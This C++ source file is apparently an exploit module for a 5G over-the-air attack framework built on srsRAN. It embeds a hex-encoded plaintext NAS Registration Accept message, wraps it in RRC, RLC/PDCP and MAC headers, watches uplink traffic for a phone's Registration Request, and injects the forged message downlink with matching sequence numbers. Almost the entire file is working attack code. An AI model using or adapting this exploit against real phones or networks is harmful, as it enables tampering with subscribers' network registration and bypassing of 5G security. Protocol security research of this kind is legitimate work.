#include "shadower/modules/exploit.h"
#include "shadower/utils/utils.h"
#include "srsran/asn1/rrc_nr.h"
#include "srsran/common/byte_buffer.h"

std::string nas_msg    = "7e04b27f4583017e0042010177000bf200f110020040ed00d2a554072000f11000000115020101210201005e0129";
uint8_t     ack_rlc[5] = {0x01, 0x03, 0x00, 0x01, 0x00};
uint8_t     rrc_nr_mac[4] = {0};

class PlaintextRegistrationAccept : public Exploit
{
public:
  PlaintextRegistrationAccept(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                              SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
    srsran::unique_byte_buffer_t rrc_nr_buffer = srsran::make_byte_buffer();
    /* Pack the message to rrc nr first */
    asn1::rrc_nr::dl_dcch_msg_s dl_dcch_msg = pack_nas_to_dl_dcch(nas_msg);
    if (!pack_dl_dcch_to_rrc_nr(rrc_nr_buffer, dl_dcch_msg)) {
      printf("Failed to pack nas to rrc_nr\n");
    }

    /* Add AM header + PDCP header */
    srsran::unique_byte_buffer_t rlc_nr_buffer = srsran::make_byte_buffer();
    pack_rrc_nr_to_rlc_nr(rrc_nr_buffer->msg, rrc_nr_buffer->N_bytes, dl_sn, dl_sn, rrc_nr_mac, rlc_nr_buffer);

    /* Pack to mac-nr */
    srsran::byte_buffer_t mac_nr_buffer;
    pack_rlc_nr_to_mac_nr(rlc_nr_buffer->msg, rlc_nr_buffer->N_bytes, 0, mac_nr_buffer, 64);

    msg = std::make_shared<std::vector<uint8_t> >(sizeof(ack_rlc) + mac_nr_buffer.N_bytes);
    memcpy(msg->data(), ack_rlc, sizeof(ack_rlc));
    memcpy(msg->data() + sizeof(ack_rlc), mac_nr_buffer.msg, mac_nr_buffer.N_bytes);
  }

  void setup() override
  {
    f_ack_sn               = wd_field("rlc-nr.am.ack-sn");
    f_sn                   = wd_field("rlc-nr.am.sn");
    f_registration_request = wd_filter("nas_5gs.mm.message_type == 0x41");
    f_rrc_setup_request    = wd_filter("nr-rrc.c1 == 0");
  }

  void pre_dissection(wd_t* wd) override
  {
    wd_register_filter(wd, f_registration_request);
    wd_register_filter(wd, f_rrc_setup_request);
    wd_register_field(wd, f_ack_sn);
    wd_register_field(wd, f_sn);
  }

  void post_dissection(wd_t*                 wd,
                       uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    if (direction == UL) {
      // If ACK SN from UE received, then update the sequence number to new sequence number
      wd_field_info_t ack_sn_info = wd_read_field(wd, f_ack_sn);
      if (ack_sn_info) {
        uint32_t ack_sn_recv = packet_read_field_uint32(ack_sn_info);
        logger.info("Received ACK SN: %u", ack_sn_recv);
        if (ack_sn_recv > dl_sn) {
          dl_sn = ack_sn_recv;
        }
      }

      // If UL message received from the base station, then we have to send the ACK back to UE
      wd_field_info_t sn_info = wd_read_field(wd, f_sn);
      if (sn_info) {
        uint32_t sn_recv = packet_read_field_uint32(sn_info);
        logger.info("Received msg with SN: %u", sn_recv);
        if (sn_recv > dl_ack_sn) {
          dl_ack_sn = sn_recv;
        }
      }

      if (wd_read_filter(wd, f_rrc_setup_request)) {
        // Reset the sequence number
        dl_sn     = 0;
        dl_ack_sn = 1;
      }

      // If security mode complete received from UE
      if (wd_read_filter(wd, f_registration_request)) {
        logger.info("\033[0;31mRegistration request detected\033[0m");
        prepare_and_send();
      }
    }
  }

private:
  void prepare_and_send()
  {
    msg->data()[3]  = 0xff & dl_ack_sn;
    msg->data()[8]  = 0xff & dl_sn;
    msg->data()[10] = 0xff & dl_sn;
    dl_buffer_queue.push(msg);
  }

  wd_filter_t f_registration_request;
  wd_filter_t f_rrc_setup_request;
  wd_field_t  f_ack_sn;
  wd_field_t  f_sn;

  uint32_t dl_sn     = 0;
  uint32_t dl_ack_sn = 1;

  std::shared_ptr<std::vector<uint8_t> > msg;
};

extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new PlaintextRegistrationAccept(dl_buffer_queue_, ul_buffer_queue_);
}
}